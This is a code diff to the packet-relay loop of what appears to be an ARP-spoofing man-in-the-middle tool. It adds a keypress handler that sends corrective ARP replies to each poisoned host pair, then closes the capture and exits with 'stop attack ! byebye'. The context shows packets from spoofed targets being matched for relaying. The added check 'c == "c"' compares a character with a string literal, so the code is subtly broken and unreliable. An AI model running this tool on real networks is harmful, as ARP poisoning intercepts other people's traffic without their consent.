@@ -65,7 +65,7 @@ int relay(const char *dev, pcap_t *pcap, u_int8_t *attacker_mac, list *targets, 
         ip_pkt = (TcpIpPacket *)packet;
         int size_of_data;
         int offset = 0;
-
+        char c;
         u_int sendsize;
         u_char data[1500];
         if (res == 0)
@@ -76,6 +76,22 @@ int relay(const char *dev, pcap_t *pcap, u_int8_t *attacker_mac, list *targets, 
             break;
         }
 
+        if (_kbhit())
+        {
+            c = _getch();
+            if (c == "c")
+            {
+                for (int i = 0; i < count; i++)
+                {
+                    request(dev, pcap, targets[i].target_mac, attacker_mac, targets[i].sender_mac, targets[i].sender_ip, targets[i].target_mac, targets[i].target_ip, htons(ArpHdr::Reply));
+                    request(dev, pcap, targets[i].sender_mac, attacker_mac, targets[i].target_mac, targets[i].target_ip, targets[i].sender_mac, targets[i].sender_ip, htons(ArpHdr::Reply));
+                }
+                pcap_close(pcap);
+                free(targets);
+                printf("stop attack ! byebye\n");
+                exit(0);
+            }
+        }
         for (int i = 0; i < count; i++)
         {
             if ((pkt->eth_.type_ == htons(EthHdr::Arp)) && (pkt->arp_.pro_ == htons(EthHdr::Ip4)) && (!memcmp(pkt->arp_.smac_, targets[i].target_mac, 6)) && (!memcmp(pkt->arp_.tip, targets[i].sender_ip, 4)))
